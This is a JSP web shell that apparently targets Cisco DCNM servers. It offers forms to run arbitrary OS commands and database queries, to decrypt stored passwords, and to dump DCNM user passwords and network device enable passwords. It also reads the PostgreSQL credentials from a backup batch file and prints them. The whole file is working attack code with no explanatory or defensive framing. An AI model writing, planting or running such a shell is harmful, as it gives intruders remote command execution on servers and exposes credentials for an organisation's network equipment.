<%@ page import="java.util.*,java.util.ArrayList,java.io.*,java.sql.*,java.net.*,dcnmWork.*"%>
<%
%>
<HTML><BODY style="background-image: url('/dcnm-client/Back.png'); background-attachment: scroll; background-color: #6699cc; background-repeat: repeat;">
<CENTER>
<TABLE style="width: 200px; height: 100" cellspacing="1" cellpadding="0">
<TR>
<FORM METHOD="GET" NAME="OSform" ACTION="">
<TD><INPUT TYPE="text" NAME="OScmd"></TD>
<TD><INPUT TYPE="submit" VALUE="Send OS Command"></TD>
</FORM>
</TR>

<TR>
<FORM METHOD="GET" NAME="DBform" ACTION="">
<TD><INPUT TYPE="text" NAME="DBcmd"></TD>
<TD><INPUT TYPE="submit" VALUE="Send DB Command"></TD>
</FORM>
</TR>

<TR>
<FORM METHOD="GET" NAME="Decrypt" ACTION="">
<TD><INPUT TYPE="text" NAME="decrypt"></TD>
<TD><INPUT TYPE="submit" VALUE="Decrypt Password"></TD>
</FORM>
</TR>
<TR>
<FORM METHOD="GET" NAME="Dump PWDS" ACTION="">
<INPUT TYPE="hidden" NAME="DumpPwds">
<TD align="center" colspan="2"><INPUT TYPE="submit" NAME="DumpPwds" VALUE="Dump Passwords"></TD>
</FORM>
</TR>
</TABLE>
<TABLE >
<TR colspan="2">
<TD>



	
<PRE>
<%
String line = "";
String FormSubmit = "";

try{
Enumeration paramNames = request.getParameterNames();
FormSubmit = (String)paramNames.nextElement();
}catch (Exception e){
FormSubmit = "";

}

String pgLogin = (String) session.getAttribute("pgLogin");
String pgPassword = (String) session.getAttribute("pgPassword");
        if (pgLogin == null) {
            
            
BufferedReader input = new BufferedReader(new FileReader(System.getProperty("user.dir") + "\\backup-pgsql-dcnm-db.bat"));

while ((line = input.readLine()) != null) {
	try{
	   if (line.matches("(?i)set PGUSER1=.*")){
		pgLogin = new String(line.replaceAll("set PGUSER1=|\"",""));
		out.println(pgLogin);
            	session.setAttribute("pgLogin", pgLogin);
		
		}else if (line.matches("(?i)set PGPASSWORD1=.*")){
		pgPassword = new String(line.replaceAll("set PGPASSWORD1=|\"",""));
		out.println(pgPassword);
		//out.println("");
            	session.setAttribute("pgPassword", pgPassword);
		}
	}catch (java.io.FileNotFoundException e){
          	out.println("Something broke");
}
}
        } else {
        //out.println("already set the session variables");    
            
        }


if (request.getParameter("DBcmd") != null) {
		
		dbquery genericQuery = new dbquery("jdbc:postgresql://127.0.0.1:5432/dcmdb",pgLogin,pgPassword,request.getParameter("DBcmd"));
		int x =0;
		int y =0;
		String matrixout = "";
		ArrayList<ArrayList> matrix = new ArrayList<ArrayList>();
		matrix = genericQuery.matrix;
	
//        	for(x = 0; x < matrix.size();x++){
//               		for(y = 0; y < matrix.get(x).size(); y++){
//                        	matrixout = matrixout + (String)((ArrayList)matrix.get(x)).get(y) + " ";
//
//        		}
//        		matrixout = matrixout + "\r\n";
//		}		
		HTMLformatter FormatGenQuery = new HTMLformatter(genericQuery.matrix);
		out.println(FormatGenQuery.Result);
        	
		}


if (request.getParameter("OScmd") != null) {
clexecute CLI = new clexecute(request.getParameter("OScmd"));
out.println(CLI.Result);
}


if (request.getParameter("decrypt") != null) {
try {
                test paul = new test(request.getParameter("decrypt"));
                out.println("decrypt result: " + paul.Result);
                } catch (Exception e) {
                out.println("that didn't work");
                e.printStackTrace();
                };

}

if (request.getParameter("DumpPwds") != null) {
String PWDQuery = "select userid,password from dcnmuser.dcnmuser UNION ALL (select 'USERNAME' AS lanname,'PASSWORD' AS lanacl FROM pg_language LIMIT 1) UNION ALL select username,password from dcnmuser.networkelementforappluser UNION ALL (select 'USERNAME' AS lanname,'ENABLE PASSWORD' AS lanacl FROM pg_language LIMIT 1) UNION ALL select username,enablepassword from dcnmuser.networkelementforappluser";

dbquery dumpPWDQuery = new dbquery("jdbc:postgresql://127.0.0.1:5432/dcmdb",pgLogin,pgPassword,PWDQuery);
                int x =0;
                int y =0;
                String matrixout = "";
                ArrayList<ArrayList> matrix = new ArrayList<ArrayList>();
                matrix = dumpPWDQuery.matrix;
		//out.println(matrix.size());

//                for(x = 0; x < matrix.size();x++){
//                        for(y = 0; y < matrix.get(x).size(); y++){
//                                matrixout = matrixout + (String)((ArrayList)matrix.get(x)).get(y) + " ";
//
//                        }
//                        matrixout = matrixout + "\r\n";
//                }
		HTMLformatterPwords pwordQuery = new HTMLformatterPwords(dumpPWDQuery.matrix);
		out.println(pwordQuery.Result);

                //out.println(matrixout);


}

%>
</PRE>
</TD>
</TR>
</TABLE>
</CENTER>
</BODY></HTML>
